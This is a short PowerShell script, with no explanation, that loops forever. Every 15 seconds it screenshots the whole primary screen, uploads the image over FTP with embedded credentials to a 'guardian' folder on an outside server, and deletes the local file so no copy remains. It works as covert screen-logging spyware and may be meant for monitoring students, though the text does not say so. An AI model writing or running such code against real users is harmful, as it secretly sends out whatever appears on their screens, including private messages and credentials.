 while( 1 )
   {
    $file = (Get-Date).ToString("yyyyMMddhhmm")+".bmp"
    $path="c:\temp\"
    $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $g=[System.Drawing.Graphics]::FromImage($b)
    $g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size)
    $g.Dispose()
    $b.Save($path + $file ,'Bmp')


    $user = "u46609125-frm"
    $password = "*****"

    $client = New-Object System.Net.WebClient
    $client.Credentials = New-Object System.Net.NetworkCredential($user, $password)
    $client.UploadFile("ftp://ftp.iesjoseplanes.es/guardian/" + $file, $path + $file )

    $archive =  $path + $file   
    Remove-Item -Path  $archive –recurse
    Start-Sleep -s 15
}
